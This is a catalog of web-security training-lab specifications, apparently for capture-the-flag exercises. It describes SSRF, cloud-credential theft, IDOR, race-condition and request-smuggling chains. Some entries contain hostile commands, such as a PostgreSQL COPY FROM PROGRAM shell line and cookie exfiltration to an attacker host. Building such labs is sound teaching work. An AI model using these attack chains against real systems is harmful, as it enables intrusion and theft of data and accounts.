labs.description: The validator strips everything after '#' before checking the host, but the fetcher (a Java URL object) treats a specially crafted string like http://internal#@trusted.com or http://trusted.com/#/../internal:8080/ differently. Learners chain fragment placement, path traversal, and scheme-relative // to smuggle the real target past a two-stage parser.
labs.objective: Reach the internal endpoint http://admin-internal:9000/flag through the /pdf?url= service on port 8000 and print the flag from the response.
labs.flag_hint: HTTP endpoint /flag on the internal admin service returns the flag; the outer app streams the fetched body back to the client, so the flag appears in the response.
skills_taught: differences between java.net.URL and validator libraries
labs.inspired_by: Orange Tsai 'Confusion Attacks' patterns; multiple GitHub Enterprise SSRFs (educational abstraction)

labs.title: Time-of-Check to Time-of-Fetch: DNS Rebinding
labs.description: The app resolves the target hostname, checks the IP is public, then a moment later performs the HTTP fetch — which re-resolves the hostname. A bundled controllable DNS server flips its answer between the first and second lookup, sending the fetcher to 127.0.0.1 while the validator saw a public IP. Learners run the DNS server and observe the race.
labs.objective: Cause the /import?url= endpoint on port 8000 to fetch http://<your-rebind-host>/flag which resolves to a public IP on lookup 1 and 127.0.0.1 on lookup 2, so the fetcher hits the internal admin at 127.0.0.1:9000/flag and returns the flag body.
labs.flag_hint: Flag exposed at http://127.0.0.1:9000/flag inside the app container; the fetcher's returned body is echoed to the HTTP response and matched by regex FLAG\{...\}.
skills_taught: why 'resolve, check, then fetch' is broken
labs.inspired_by: MongoDB/Redis DNS-rebinding attacks by Brannon Dorsey (2018); repeatedly seen in bug bounties

labs.title: Decimal, Octal, Hex, Dotless: IP Encoding Roulette
labs.description: The blocklist rejects any URL containing '127.', '10.', '172.16.', '192.168.', or '169.254.' as a substring. Learners defeat it using decimal (2130706433), hex (0x7f000001), octal (0177.0.0.1), dotless integer, and the mixed 0x7f.1 form. Each attempt is scored by the checker so learners see which encodings win.
labs.objective: Land three distinct encodings of 127.0.0.1 that the /health?target= probe on port 8000 accepts and successfully fetches http://127.0.0.1:9000/flag; the /solve endpoint releases the flag once three unique encodings appear in its log.
labs.flag_hint: HTTP endpoint /solve on port 8000 counts distinct-encoded loopback URLs the fetcher hit (recorded to /var/log/ssrf.log); returns the flag when count >= 3.
labs.inspired_by: Classic Orange Tsai numeric-IP bypass catalog; still applicable to modern stacks

labs.title: IMDSv2 Isn't Immune: Header-Based Token Dance
labs.description: The mock cloud runs IMDSv2, which requires a PUT to /latest/api/token with header X-aws-ec2-metadata-token-ttl-seconds and then presenting the returned token as X-aws-ec2-metadata-token on the read. The SSRF sink is a URL-preview service that supports custom method and headers via query params — the exact ergonomic sin that keeps IMDSv2 exploitable.
labs.objective: Chain a PUT (to obtain a metadata token) and a GET (using the token) via /preview?url=&method=&header= on port 8000, then read /latest/meta-data/iam/security-credentials/app-role and submit the SessionToken to /solve.
labs.flag_hint: HTTP endpoint /solve validates the SessionToken against the mock IMDSv2 sidecar and returns the flag on match.
skills_taught: why IMDSv2 is a mitigation not a cure
labs.inspired_by: Grafana CVE-2024-1313 style header-forwarding fetchers; general IMDSv2-bypass writeups 2022-2025

labs.title: Metadata-Flavor: Google — GCP Service Account Theft
labs.description: A GCP-flavored mock metadata server on 169.254.169.254 rejects requests lacking header 'Metadata-Flavor: Google'. The vulnerable app's fetcher supports custom headers. Learners retrieve an OAuth2 access token from computeMetadata/v1/instance/service-accounts/default/token and use it against a mock googleapis endpoint to read a 'flag' bucket object.
labs.objective: Retrieve an access_token from the metadata server via the /fetch endpoint on port 8000, then use it (via the same fetcher) to GET http://mock-gcs:8081/storage/v1/b/private/o/flag.txt?alt=media and print the flag body.
labs.flag_hint: Flag returned by the mock GCS endpoint when a valid short-lived token from the mock metadata service is presented in Authorization: Bearer.
skills_taught: chaining SSRF into cloud API calls
labs.inspired_by: Numerous GCP SSRF disclosures 2022-2024; Chris Moberly research on cloud metadata

labs.title: Azure IMDS: The Metadata:true Header Path
labs.description: Azure's IMDS at 169.254.169.254 requires header 'Metadata: true' and rejects any request with an X-Forwarded-For. Learners abuse a report-generator that forwards user-controlled headers to obtain a Managed Identity token, then use it against a mock Key Vault to read a secret containing the flag.
labs.objective: From /generate-report?url= (port 8000) with a custom Metadata:true header, retrieve an MSI access_token, then call http://mock-kv:8443/secrets/flag?api-version=7.4 through the same endpoint and print the returned value.
labs.flag_hint: HTTP endpoint /secrets/flag on the mock Key Vault returns the flag when a valid signed MSI token issued by the mock IMDS is presented.
labs.inspired_by: Azure MSI SSRF patterns; multiple Microsoft researcher writeups 2023-2025

labs.title: gopher:// to Redis: SET, EVAL, and RCE
labs.description: An internal Redis 7 instance listens on 6379 without auth. The SSRF sink is a favicon fetcher whose URL library still supports gopher://. Learners craft a gopher payload with CRLFs to pipeline SET/CONFIG/EVAL commands. The lab teaches the exact byte layout of RESP over gopher and progresses from SET (write a marker) to EVAL (execute a Lua command that touches the filesystem).
labs.objective: Use gopher:// via /favicon-proxy?url= (port 8000) to make Redis execute an EVAL that writes the string in the FLAG env var to /shared/flag.out; a bundled checker reads that file and prints the flag.
labs.flag_hint: checker.sh watches /shared/flag.out (volume shared with Redis); the flag appears once EVAL runs and writes it.
labs.inspired_by: Chaitin Tech's 2017 Redis-via-gopher research; still-live in legacy PHP+libcurl stacks

labs.title: Follow the Bouncing Redirect: Webhook Validator Bypass
labs.description: A webhook validator resolves the target host once, confirms it's public, then issues an HTTP request with follow-redirects enabled. Learners host a public 302 that points to http://169.254.169.254/... or http://internal:8080/. The check-then-follow pattern is a classic mid-tier SSRF class.
labs.objective: Register a webhook (POST /webhooks on port 8000) pointing to a public HTTP URL you control (the OOB server on port 9000 supports arbitrary 302s). Have it redirect to http://internal-admin:8080/flag; the webhook validator's fetched body is stored and shown at GET /webhooks/<id>/last, which contains the flag.
labs.flag_hint: The stored 'last response body' for the webhook (viewable via GET /webhooks/<id>/last) contains the flag when the redirect chain succeeds.
labs.inspired_by: GitLab CVE-2021-22214, generic pattern in Stripe/HackerOne webhook SSRFs

labs.title: XSPA: Port Scanning Through a Favicon Fetcher
labs.description: The favicon endpoint returns different response times / sizes / status codes depending on whether the target port is open, closed, or filtered. Learners write a small script that iterates 127.0.0.1:1-65535 through the /favicon?target= endpoint and identifies the two open internal ports. One of them serves the flag.
labs.objective: Enumerate open ports on 127.0.0.1 via /favicon?target=host:port (port 8000) using response-code / body-length side channels, then fetch /flag from the discovered service on the higher-numbered open port.
labs.flag_hint: Flag is served at http://127.0.0.1:<discovered-port>/flag; the port is randomized per container start (written to /shared/port.env for the checker) so learners must actually scan.
skills_taught: converting a fetcher into a scanner
labs.inspired_by: Riyaz Walikar's XSPA class; ongoing pattern in URL-preview products

labs.title: SVG as a Fetcher: librsvg xlink:href SSRF
labs.description: A profile-image uploader accepts SVG and renders it to PNG server-side using librsvg. Older/misconfigured librsvg follows xlink:href to remote URLs and to file:// URIs. Learners craft an SVG that references an internal URL, triggering an SSRF where the rendered PNG embeds bytes from the internal response.
labs.objective: Upload an SVG to POST /upload on port 8000 whose xlink:href points at http://internal:8080/flag; the rendered PNG (available at GET /avatar/<id>.png) will contain the flag text baked into an image — read it out and submit to /solve.
labs.flag_hint: The rendered PNG contains the flag as visible text (drawn into the raster by librsvg's image element); learners OCR or eyeball it and POST to /solve which validates the exact FLAG token.
labs.inspired_by: Numerous librsvg-based avatar SSRFs; CVE-2023-38633 conceptual family

labs.title: gopher:// to PostgreSQL: COPY FROM PROGRAM to RCE
labs.description: An internal PostgreSQL 16 listens on 5432 with a superuser bound to trust-auth from localhost. The SSRF sink accepts arbitrary schemes via a custom libcurl wrapper. Learners must construct a gopher payload that speaks the PostgreSQL v3 startup + simple query flow, authenticate as the superuser, and issue COPY … FROM PROGRAM 'sh -c ...' to touch a shared file.
labs.objective: Deliver a gopher:// payload via /fetch?url= (port 8000) that logs in as superuser 'app' and executes COPY t FROM PROGRAM 'sh -c "cat /flag > /shared/out"'; the checker greps FLAG from /shared/out.
labs.flag_hint: checker.sh reads /shared/out (shared volume with the pg container) after each attempt; flag appears when COPY FROM PROGRAM lands.
skills_taught: COPY FROM PROGRAM as RCE primitive
labs.inspired_by: Cure53 pgAdmin research; general 'trust auth from localhost' misconfig class

labs.title: Kubelet on 10250: SSRF to Container Exec
labs.description: A monitoring dashboard fetches arbitrary URLs and follows redirects. On the same pod network runs a mock kubelet on :10250 whose /pods endpoint is unauthenticated (misconfigured --anonymous-auth=true). Learners enumerate pods, then use the /exec/<ns>/<pod>/<container> upgrade path to run 'cat /flag' inside a target pod. Tests handling of an HTTP-upgrade SSRF where the fetcher must be tricked into exposing the streamed body.
labs.objective: From /health-check?url= (port 8000) enumerate pods on kubelet 10250, then exec 'cat /flag.txt' in the 'vault' container of the 'kv' pod and return the flag via the response body.
labs.flag_hint: Flag lives at /flag.txt inside the mock 'vault' container; the successful exec streams it back through the fetcher and it appears in the response.
labs.inspired_by: Handful of real 10250 exposures (Shopify, Tesla-EKS-style); Peter Adkins research

labs.title: ImageMagick MSL: SSRF and File Reads via Magick Scripting
labs.description: An image thumbnailer runs a legacy ImageMagick 6 policy that still permits the MSL and ephemeral coders. Learners upload a crafted 'image' that is actually MSL XML, causing IM to fetch an internal URL or read /flag.txt and write it into the output PNG. Distinct from ImageTragick — this is the msl:/ scripting angle.
labs.objective: Upload a payload to POST /thumbnail on port 8000 that causes ImageMagick to read /flag.txt and render its content into the output PNG at /thumb/<id>.png; read the flag from the image and submit to /solve.
labs.flag_hint: Output PNG contains the flag as rendered text; /solve validates the exact FLAG token.
labs.inspired_by: ImageTragick family; ongoing MSL/ephemeral CVEs 2022-2024 in legacy IM deployments

labs.title: ffmpeg HLS Concat: Local File Read via Video Job
labs.description: A video-transcoding service accepts an HLS (.m3u8) URL and hands it to ffmpeg. Learners host an m3u8 that references file:///flag.txt as a segment (via concat: or file: URIs), causing ffmpeg to embed the flag content into the resulting output stream's metadata / raw bytes.
labs.objective: Submit a crafted m3u8 URL to POST /jobs on port 8000; when the job finishes, the transcoded output at /jobs/<id>/output.ts contains the flag bytes — extract and submit to /solve.
labs.flag_hint: Transcoded output file contains the raw flag content; /solve accepts POST with the FLAG token extracted from the output.
skills_taught: HLS m3u8 as an attack surface
extracting data from binary media output
labs.inspired_by: Neex 'ffmpeg HLS' 2016 research; still resurfaces in transcoding SaaS bug bounties

labs.title: PDF Generators Are Browsers: wkhtmltopdf SSRF/LFI
labs.description: An invoice generator renders user-supplied HTML with wkhtmltopdf, which uses an embedded WebKit that permits file:// and follows same-origin fetches. Learners inject
labs.objective: Submit HTML to POST /invoice on port 8000 that causes the resulting PDF to include the contents of /flag.txt and the body of http://internal-admin:9000/audit; download the PDF from /invoice/<id>.pdf and extract both values, submitting them to /solve.
labs.flag_hint: Generated PDF contains both the local file content and the internal fetch body as visible text; /solve requires both tokens.
labs.inspired_by: Recurring wkhtmltopdf SSRF/LFI reports 2020-2024 across invoicing SaaS

labs.title: Headless Chromium: Same-Origin CDP Exposure
labs.description: A screenshot service launches headless Chromium with --remote-debugging-port bound to localhost. The SSRF-vulnerable endpoint can reach 127.0.0.1:9222, which exposes the DevTools JSON list and a WebSocket for arbitrary Runtime.evaluate. Learners chain SSRF → CDP discover → craft a WebSocket-over-HTTP or use the JSON /new?url= endpoint (which itself is a fetcher) to read the flag.
labs.objective: Reach the local Chromium CDP endpoint on 127.0.0.1:9222 via /screenshot?url= (port 8000), open a new tab pointing to file:///flag.txt via /json/new?, then screenshot it and extract the flag.
labs.flag_hint: The screenshot rendered by the second SSRF hop shows /flag.txt content; /solve validates the FLAG token submitted from the OCR-ed image.
labs.inspired_by: Multiple headless-Chrome CDP exposures 2022-2025; Cyllectyve/CTF appearances

labs.title: jar:// on Java: Nested-Archive Local Read
labs.description: A Java-based document importer accepts URLs and hands them to java.net.URL, which supports jar:file:///flag.jar!/... and jar:http://internal/x.jar!/... Learners exploit the jar: scheme to read internal file contents and to reach an internal service that hosts a jar. The lab teaches Java-specific SSRF primitives that most allowlists forget.
labs.objective: Use /import?url= on port 8000 with a jar: URL to read the entry 'flag.txt' from /var/lib/app/data.jar and print its content in the response.
labs.flag_hint: The jar at /var/lib/app/data.jar contains an entry named flag.txt whose bytes are the flag; server streams the entry back through the response.
skills_taught: why Java SSRF needs scheme allowlists not host allowlists
labs.inspired_by: Java jar-scheme SSRF pattern; recurring in Confluence/enterprise Java advisories

labs.title: Elite Chain: SSRF to IMDSv2 to Signed S3 Object
labs.description: A multi-hop chain: (1) parser-confusion SSRF in a PDF-preview service, (2) header-supporting fetcher enabling IMDSv2 token retrieval, (3) SigV4-signed request from the learner's laptop using stolen creds against a mock S3 that requires a specific bucket path. Requires writing a small SigV4 signer, not just curling. The lab ships an S3-compatible mock (MinIO-like) that only accepts requests signed by the exact rotated creds.
labs.objective: Chain the SSRF at /pdf?url= (port 8000) through IMDSv2 to obtain temporary IAM credentials, then sign a GetObject request for s3://secrets/flag.txt on the mock S3 at http://mock-s3:9000 and submit the returned body to /solve.
labs.flag_hint: Flag is served by the mock S3 as the body of s3://secrets/flag.txt only when a valid SigV4 signature using the currently rotated temp creds is presented; /solve validates the exact bytes.
labs.inspired_by: Capital One class + modern IMDSv2 header-forwarding CVEs; 2024 signed-URL variants

labs.title: Elite Chain: DNS Rebinding to Unauth Kubernetes API to Pod Creation
labs.description: The vulnerable app validates that the fetch target resolves to a public IP, then uses a session-pinning HTTP client — but the pin is per-connection, not per-hostname. Learners run a DNS rebind against a target reached across two separate connections. Behind the rebound target lives a misconfigured Kubernetes API server on 127.0.0.1:6443 that allows anonymous 'get' AND 'create pods' on the 'default' namespace. Learners create a Pod that mounts the host /flag via a hostPath and reads it out via the pod's stdout.
labs.objective: Chain DNS rebinding through /audit?url= (port 8000) to talk to the local Kubernetes API on 127.0.0.1:6443, create a Pod with hostPath /flag mounted, and stream the pod logs back to obtain the flag; submit to /solve.
labs.flag_hint: Flag file at /flag on the mock node is mountable via hostPath; the created pod's stdout contains the flag when it 'cat /mnt/flag' — /solve validates the FLAG token.
skills_taught: multi-hop DNS rebinding with connection pinning
labs.inspired_by: Shopify 2018 and Tesla-EKS 2018 unauthenticated K8s; DNS-rebinding bypass research 2023-2025

labs.title: Elite Chain: gopher to Redis Master-Replica RCE via Module Load
labs.description: The internal Redis 6 is protected against EVAL (Lua sandbox hardened) and CONFIG SET dir is filtered — but it will still SLAVEOF a controllable master. Learners host a fake Redis master (bundled binary) that ships a malicious module via full-resync RDB, then send MODULE LOAD via gopher SSRF. The module runs a shell command that stages the flag. This is the current-generation Redis-SSRF-to-RCE path when older EVAL/CONFIG paths are patched.
labs.objective: Chain gopher:// via /avatar-fetch?url= (port 8000) to make Redis SLAVEOF the fake-master container, receive the malicious .so via replication, MODULE LOAD it, then run 'system.exec cat /flag' via the module and stage the flag to /shared/out; checker.sh returns it.
labs.flag_hint: Bundled checker.sh polls /shared/out; the flag appears once MODULE LOAD executes the shell primitive.
skills_taught: MODULE LOAD as post-auth RCE primitive
chaining gopher to a multi-command Redis session
labs.inspired_by: n0b0dy/redis-rogue-server 2019 research; ongoing 2022-2025 Redis-SSRF chains against modern hardened builds

labs.title: Sequential Invoice IDOR
labs.description: Billing portal serves invoices at /api/invoices/{id} using auto-increment integers. Ownership check is missing; any authenticated user can iterate IDs and read another customer's invoice, including the CFO's founding invoice which holds a flag in the memo field.
labs.objective: Log in as low-privilege user 'norm' and retrieve invoice id=1 (belongs to admin). Submit the memo string to /solve to unlock the flag.
labs.flag_hint: The memo column of invoice_id=1 in Postgres is the flag. GET /api/invoices/1 returns the JSON containing the flag; POST /solve with {"memo":"..."} echoes the canonical FLAG{...} on match. checker.sh confirms.
labs.inspired_by: Optus (Australia) 2022 breach — ~9.8M records exposed via sequential IDs on an unauthenticated API.

labs.title: Force-Browse the Admin Panel
labs.description: A task-manager app has an /admin/ path that is not linked from any UI. It is disallowed in /robots.txt and referenced in a stray bundle.js comment. No authentication is required once the URL is found because the developer 'assumed it would stay hidden'.
labs.objective: Discover the /admin/console URL via recon and read the 'Emergency Broadcast' note.
labs.flag_hint: GET /admin/console renders an HTML page whose <div id='broadcast'> element contains the flag. No session state required.
labs.inspired_by: novel — classic 'security through obscurity' pattern seen in dozens of small-vendor advisories.

labs.title: Front-End-Only Role Check
labs.description: A React SPA hides the 'Delete User' and 'Impersonate' buttons when `user.role !== 'admin'`. The corresponding DELETE and POST endpoints on the API have no server-side authorization at all.
labs.objective: Delete the honeypot user 'canary' from a non-admin session using the raw API.
labs.flag_hint: GET /solve returns the flag when SELECT count(*) FROM users WHERE username='canary' = 0 in the DB.
labs.inspired_by: novel — pattern from countless SPA bug-bounty reports.

labs.title: Admin Check via Referer Header
labs.description: A legacy CMS decides an incoming request is 'from the admin UI' by inspecting Referer for a leading /admin/ path. There is no session role check on the password-reset endpoint.
labs.objective: Force-reset the password of user 'target' from a normal browser session by forging the Referer header.
labs.flag_hint: POST /solve returns the flag once the target user's password_hash column no longer matches its original bcrypt value (delta observed by checker.sh).
labs.inspired_by: novel — historical Cisco / D-Link admin console patterns.

labs.title: HTTP Verb Switch Bypass
labs.description: A Spring Boot admin action /admin/promote is protected by a WAF rule that only inspects POST bodies. The controller uses @RequestMapping without specifying method, so GET reaches the same handler unfiltered.
labs.objective: Promote your own account to ROLE_ADMIN via GET, then read /admin/system which returns the contents of /flag.txt inside the container.
labs.flag_hint: /flag.txt is world-readable inside the container; it is echoed on the /admin/system page only when the JWT carries ROLE_ADMIN.
labs.inspired_by: novel — a distilled variant of numerous J2EE verb-tampering CVEs (e.g., historical @RequestMapping misconfigurations).

labs.title: Base64-Wrapped Sequential ID
labs.description: A storefront exposes orders at /api/orders/{token} where token looks opaque (eyJpZCI6MTAyfQ==) but decodes to {"id":102}. Devs assumed 'encoded means secure'.
labs.objective: Read the admin's order id=1 which includes a support-ticket flag in the notes column.
labs.flag_hint: GET /api/orders/<base64({"id":1})> returns JSON containing the flag in `internal_notes`.
labs.inspired_by: novel — pattern used by many ecommerce APIs (Shopify partner reports over the years).

labs.title: UUID v1 Reset-Token Prediction
labs.description: Password-reset tokens are UUID v1 generated on the server. Since v1 embeds a 60-bit timestamp and the server's MAC node ID leaks in any of your own tokens, a reset issued to another user seconds later can be bracket-guessed.
labs.objective: Request a reset for admin, then brute-force the small time/counter window using your own captured UUIDv1 seed values; consume the token to log in as admin.
labs.flag_hint: POST /solve returns the flag when the admin session cookie belongs to user id=1 (verified server-side by checker.sh polling the sessions table).
labs.inspired_by: Sam Erb's 'How I Hacked Play.Google.Com with a UUID' write-up style; multiple UUIDv1 predictability advisories 2020-2024.

labs.title: HTTP Parameter Pollution on role=
labs.description: Signup form submits application/x-www-form-urlencoded body 'role=user'. A WAF inspects only the first occurrence, but body-parser aggregates duplicates into an array and the ORM takes the LAST value. Adding a second 'role=admin' elevates the account.
labs.objective: Register an admin account and load /admin, which returns a flag banner.
labs.flag_hint: /admin returns the flag whenever req.user.role === 'admin'. checker.sh verifies via the DB.
labs.inspired_by: novel — classic HPP pattern; academic paper by Balduzzi et al. 2011 still relevant.

labs.title: Mass Assignment via Extra JSON Field
labs.description: PATCH /api/users/me hydrates the user model from the request body using loose strong_params (`params.permit!`). Adding {"is_admin":true,"tenant_id":1} elevates you.
labs.objective: Elevate to admin and read /admin/config which reveals the flag.
labs.flag_hint: /admin/config returns the flag when current_user.is_admin is true. checker.sh reads the users table to confirm.
labs.inspired_by: Egor Homakov's 2012 GitHub Rails mass-assignment disclosure — canonical case study.

labs.title: Content-Type Switch: XML Where JSON Is Validated
labs.description: A registration endpoint runs a strict JSON schema validator but the Spring controller also accepts application/xml (via jackson-dataformat-xml) with no equivalent schema. XML lets you set role=ADMIN directly.
labs.objective: Register a user with ROLE_ADMIN using an XML request body and then read /admin/config.
labs.flag_hint: /solve returns the flag when a user with ROLE_ADMIN exists whose username was created after container start.
labs.inspired_by: novel — themed on several Jackson XML/JSON confusion CVEs (CVE-2019-14540 family).

labs.title: PATCH vs PUT Authorization Gap
labs.description: PUT /api/users/{id} is guarded with @PreAuthorize("#id == principal.id"), but a later-added PATCH handler on the same path forgot the annotation. Attacker patches admin's email to an OOB collector.
labs.objective: Change admin's email to the OOB collector on port 9000, trigger a password-reset flow, and consume the reset link that arrives there.
labs.flag_hint: OOB service on :9000 exposes /captured; when the reset link is clicked (curl -L), the app writes the flag to /captured/flag which curl returns.
labs.inspired_by: novel — mirrors many Spring Data REST verb-omission findings.

labs.title: Path Traversal Bypasses Role Middleware
labs.description: Custom middleware protects any request whose request.path startswith '/admin'. Starlette normalizes double-decoded slashes AFTER the middleware runs, so /public/..%2fadmin/config bypasses the check but still routes to the admin handler.
labs.objective: Access /admin/config through the bypassed path and read the flag returned in JSON.
labs.flag_hint: /admin/config returns JSON {"flag":"..."} for any request that reaches its handler.
labs.inspired_by: CVE-2021-22986/CVE-2022-22947 (Spring Gateway path-parsing) and similar Django/Flask normalization CVEs.

labs.title: GraphQL Relay node(id) IDOR
labs.description: A Relay-style API exposes node(id: ID!) that dereferences any global object ID (base64 of 'Type:pk'). No per-type authorization is enforced when hydrating.
labs.objective: Fetch a private direct message that belongs to admin using a crafted global ID.
labs.flag_hint: The DM's body field contains the flag; /solve accepts the returned body and confirms.
labs.inspired_by: Public bug-bounty reports against Shopify, GitLab, and GitHub Relay-style APIs (2020-2023).

labs.title: Weak Signed Download URL
labs.description: S3-style downloads are gated by URLs of the form /files/{name}?sig=MD5(user_id + filename + secret). The static bundle ships a source map exposing the secret constant, and MD5 requires no user binding beyond user_id in plaintext.
labs.objective: Forge a signed URL that grants you admin's 'expense-report.pdf' and extract the flag embedded in the PDF metadata.
labs.flag_hint: pdftotext expense-report.pdf prints a line containing FLAG{...}; /solve accepts the flag string.
labs.inspired_by: Peloton API (2021) and Grafana signed-URL flaws — signed URL missing per-user binding pattern.

labs.title: Feature Parity Gap: IDOR in Export/Print
labs.description: GET /invoices/{id} enforces ownership, but GET /invoices/{id}/pdf and /invoices/{id}/print were added later and share no middleware. Both render the same underlying document.
labs.objective: Export admin's invoice #1 as PDF and recover the flag hidden as invisible white text inside.
labs.flag_hint: pdftotext exposes the FLAG{...} string; /solve verifies via curl.
labs.inspired_by: novel — extremely common pattern in SaaS invoicing and healthcare portals.

labs.title: X-Tenant-ID Header Trust
labs.description: A multi-tenant SaaS uses the client-supplied X-Tenant-ID header to scope all queries. There is no cross-check that the JWT's tenant matches the header. Swap the header and read the other tenant's data.
labs.objective: As user of tenant 'blueco', read the secret vault entry of tenant 'acme-secure'.
labs.flag_hint: /api/vault/get returns the flag when authenticated and X-Tenant-ID=acme-secure resolves to a valid row for id=1.
labs.inspired_by: Numerous 2023-2025 SaaS BOLA disclosures on HackerOne (multi-tenant scoping via header).

labs.title: Bulk-Fetch Endpoint Mass IDOR
labs.description: POST /api/bulk-user-fetch accepts {"ids":[...]} up to 200 entries. The endpoint checks that the caller is authenticated but performs no per-ID ownership check. Response leaks TOTP secrets alongside profiles.
labs.objective: Enumerate admin's TOTP seed, then perform a full password + TOTP login as admin and read /admin/root.
labs.flag_hint: /admin/root returns the flag only after a real HTTP login that satisfies password + TOTP verification against admin's account.
labs.inspired_by: novel — pattern common in fintech and neobank APIs (multiple 2023-2024 HackerOne disclosures).

labs.title: Second-Order IDOR via Share Endpoint
labs.description: POST /documents/{docId}/share accepts {user_id, role} and inserts a share row without verifying that the caller owns docId. Attacker adds themselves as editor of the CEO's confidential doc.
labs.objective: Grant your own account 'editor' on document owned by admin, then read the doc, submit the leaked contract number.
labs.flag_hint: /solve accepts contract_number; checker.sh matches against the DB row and returns the flag.
labs.inspired_by: Recurring patterns in Google Docs, Confluence, and Notion share-endpoint reports.

labs.title: STOMP WebSocket Subscription IDOR
labs.description: The Spring WebSocket app allows any authenticated client to SUBSCRIBE to /topic/user.{id}.notifications without ownership check. Reset-code push notifications flow to whoever subscribes.
labs.objective: Subscribe to admin's notification channel, capture the password-reset OTP that arrives during a triggered reset, and use it to take over the account and read /admin/vault.
labs.flag_hint: /admin/vault returns the flag when authenticated as admin (checker.sh verifies session ownership).
labs.inspired_by: novel — reflects several 2023-2025 real-time-app BOLA disclosures.

labs.title: GraphQL Alias Batching Rate-Limit Bypass
labs.description: The API rate-limits by operationName, not by cost. Aliasing 100 user(id:) selections in one request lets an attacker enumerate 10,000+ user records including admin's off-band reset email in minutes.
labs.objective: Enumerate all user emails, discover admin's OOB reset alias, trigger reset, catch the token on the OOB collector at :9000, complete admin takeover.
labs.flag_hint: OOB collector on :9000 exposes /captured/token; using the token at /reset returns the flag once admin's password is rotated.
labs.inspired_by: HackerOne reports against GitLab and Twitter GraphQL endpoints (2022-2024).

labs.title: TOCTOU Race in Wallet Transfer
labs.description: POST /wallet/transfer reads balance, checks it, then writes — with no SELECT FOR UPDATE and no unique row lock. Parallel requests double-spend, and a signed 'transfer to' field can be swapped mid-flight so admin's balance ends up on your account.
labs.objective: Empty admin's wallet (starts at 1,000,000) into your account by winning the race.
labs.flag_hint: /solve returns the flag when SELECT balance FROM wallet WHERE user='attacker' > 999999 AND admin balance = 0.
labs.inspired_by: Public DeFi 'reentrancy of concurrency' bugs and PortSwigger race-window research (James Kettle, 2023).

labs.title: JWT Tenant Claim vs URL Confusion
labs.description: Tokens contain {tid:"acme"} while tenant is derived from URL /t/{tenant}/api/... The two are never cross-validated. Additionally, the 'kid' header allows loading a JWK from a whitelisted-by-substring URL (matching by simple `contains`), enabling forgery for foreign tenants.
labs.objective: Access /t/target/api/admin as target-tenant admin using a forged token.
labs.flag_hint: /t/target/api/admin returns the flag when JWT verifies to (sub=admin, tid=target) and URL tenant='target'.
labs.inspired_by: Sam Curry et al. 2023 Toyota GSPIMS write-up (tenant/JWT confusion enabling cross-org admin).

labs.title: Cache-Key Confusion Leaks Admin PII
labs.description: Varnish caches /api/me on URL alone; the origin varies response by Authorization header, but the cache key does not include it. A well-timed request stores admin's response for everyone.
labs.objective: Poison the cache so an unauthenticated fetch returns admin's /api/me containing an internal API key; use that key at /admin/keys/rotate to obtain the flag.
labs.flag_hint: /admin/keys/rotate returns the flag when called with a valid admin API key issued at build time.
labs.inspired_by: James Kettle 'Practical Web Cache Poisoning' research; multiple 2022-2024 unkeyed-Authorization CVEs.

labs.title: Chained IDOR to PII to Account Takeover
labs.description: Three-step chain: (1) BOLA on /api/users/{id}/profile leaks phone numbers. (2) SMS OTP reset flow uses only last-4 of phone + 6-digit OTP but does not rate-limit per user. (3) Combine 1+2 to take over the admin account.
labs.objective: Fully take over the admin account and access /admin/dashboard which renders the flag in the header banner.
labs.flag_hint: /admin/dashboard displays the flag inside <header data-role='admin-banner'> once authenticated as admin.
labs.inspired_by: Sam Curry 2020 Starbucks and 2022 Peloton-style chain reports (BOLA -> PII -> ATO).

labs.title: Signed URL IDOR into SSRF into Admin Cookie Exfil
labs.description: Complex chain: (1) Signed download URL includes an unsigned 'src' host parameter used server-side for fetches. (2) Swap host to point at an internal admin service. (3) The internal service leaks a Set-Cookie in the response. (4) Exfil admin cookie to attacker collector.
labs.objective: POST admin's session cookie to http://attacker:9000/exfil; the collector validates the cookie signature and issues the flag.
labs.flag_hint: OOB collector on :9000 writes /solve/flag when a cookie whose signature matches the app's HS256 admin signing key is received; curl /solve/flag returns the flag.
labs.inspired_by: Grafana SSRF chains (CVE-2022-31097 family) and 2023 Airbnb/Grafana bug-bounty write-ups.

labs.title: GraphQL Full-Kill Cross-Tenant Chain
labs.description: Elite composite: (1) node(id:) IDOR crosses tenant boundary. (2) Mutation batching lets you send updateUserRole and grantAdmin in one request under a benign operationName. (3) Subscription to tenant.{id}.audit leaks the admin session's CSRF token. Together they yield foreign-tenant admin takeover.
labs.objective: Take over a foreign tenant's admin account and load the cross-tenant billing dashboard whose chart title reveals the flag.
labs.flag_hint: The cross-tenant billing dashboard renders the flag as the title of the top chart when authenticated as target-tenant admin (checker.sh scrapes DOM).
labs.inspired_by: Composite of 2023-2025 SaaS BOLA disclosures; conceptually mirrors the Toyota GSPIMS and Salesforce Community Cloud cross-tenant chains.

labs.title: WebSocket Race + Bulk IDOR Beats 2FA Admin
labs.description: Ownership transfer of admin API keys is done over Socket.IO with an emit('transferKey', {keyId,to}) that check-then-writes. Bulk 'keys.get' endpoint leaks key IDs. Winning a race across many concurrent socket messages transfers admin's 2FA-bypass key to attacker before the admin-triggered rotation completes.
labs.objective: Obtain a valid admin 2FA-bypass key and use it against /admin/vault to read the final flag.
labs.flag_hint: /admin/vault returns the flag when a request presents a valid admin bypass key AND the caller session belongs to a user whose role is admin (both required, checker.sh confirms both conditions were satisfied).
labs.inspired_by: novel — synthesized from PortSwigger race research (2023) plus 2024 real-time SaaS BOLA reports.

labs.title: CL.TE Baseline: The Two-Headed Request
labs.description:
A classic front-end/back-end mismatch. nginx (front) honors Content-Length, an Express upstream honors Transfer-Encoding: chunked. A guided walkthrough teaches the CRLF layout, `
0

` terminator, and how the smuggled prefix `G` corrupts the next victim request. Includes a Burp-Repeater-friendly walkthrough hint file and a scripted victim that polls `/admin` every 500 ms so you get feedback fast.
labs.objective: Smuggle a request that prepends `GPOST /admin/promote?user=guest HTTP/1.1\r\n...` to the next authenticated admin request, causing the admin's session to promote user `guest` to role `admin`. Then log in as `guest` and read `/flag`.
labs.flag_hint: HTTP endpoint GET /flag returns the flag string only when the users table row for `guest` has role='admin' (checked by a Flask sidecar `checker.py` reading Postgres).
labs.inspired_by: PortSwigger 'HTTP request smuggling, basic CL.TE vulnerability' + James Kettle 'HTTP Desync Attacks' (Black Hat 2019)

labs.title: TE.CL Baseline: Chunked at the Edge, Length Behind
labs.description: The mirror image of CL.TE. HAProxy 2.9 in legacy mode forwards `Transfer-Encoding: chunked`; the gunicorn/Flask backend falls back to Content-Length. You learn to craft a chunk-size line whose numeric prefix aligns exactly with the smuggled body length so the backend reads a self-contained smuggled request.
